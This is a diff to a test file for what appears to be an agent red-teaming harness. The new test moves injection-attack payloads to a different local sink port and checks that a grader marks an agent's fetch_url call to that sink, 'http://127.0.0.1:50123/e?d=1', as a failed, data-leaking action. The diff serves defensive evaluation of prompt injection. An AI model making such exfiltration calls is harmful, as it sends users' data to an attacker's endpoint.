@@ -7,17 +7,18 @@ from conftest import offline_retriever
 from fakes import ScriptedLLM
 
 from redline.agent.agent import Agent
-from redline.attacks.graders import GRADERS, GraderCtx, build_grader
+from redline.attacks.graders import GRADERS, GraderCtx, build_grader, sink_hostports
 from redline.attacks.run import (
     build_tasks,
     make_attack_fn,
     manifest,
     module_rollup,
+    retarget_sink,
     setup_documents,
     summarise,
     wilson,
 )
-from redline.attacks.schema import CHECK_NAMES, Attack, Check
+from redline.attacks.schema import CHECK_NAMES, Attack, Check, load_library
 from redline.config import Config
 from redline.kb.corpus import Document
 from redline.store.store import Store
@@ -72,6 +73,22 @@ async def test_sink_url_and_fetch_to_sink():
     assert await score("fetch_to_sink", transcript(tool_calls=[fetch])) == 0.0
     good = ToolCall("fetch_url", {"url": "http://localhost:11434/x"}, {})
     assert await score("fetch_to_sink", transcript(tool_calls=[good])) == 1.0
+
+
+async def test_a_sink_on_another_port_is_targeted_and_graded_there():
+    """The CI gate binds a free port: the payloads must aim at it and the graders must judge against it."""
+    lib = [a for a in load_library() if "127.0.0.1:8765" in a.model_dump_json()]
+    assert len(lib) >= 5
+    moved = retarget_sink(lib, 50123)
+    assert all("8765" not in a.model_dump_json() and "127.0.0.1:50123" in a.model_dump_json() for a in moved)
+    assert [a.id for a in moved] == [a.id for a in lib]
+    ctx = GraderCtx(store=Store(), sys_canary=SYS, sink_hostports=sink_hostports(50123))
+    fetch = ToolCall("fetch_url", {"url": "http://127.0.0.1:50123/e?d=1"}, {})
+    g = build_grader(Check(check="fetch_to_sink"), ctx)
+    assert (await g(task(), transcript(tool_calls=[fetch]))).score == 0.0
+    old = ToolCall("fetch_url", {"url": "http://127.0.0.1:8765/e?d=1"}, {})
+    assert (await g(task(), transcript(tool_calls=[old]))).score == 1.0
+    assert retarget_sink(lib, 8765) == lib
 
 
 async def test_email_to_non_customer():
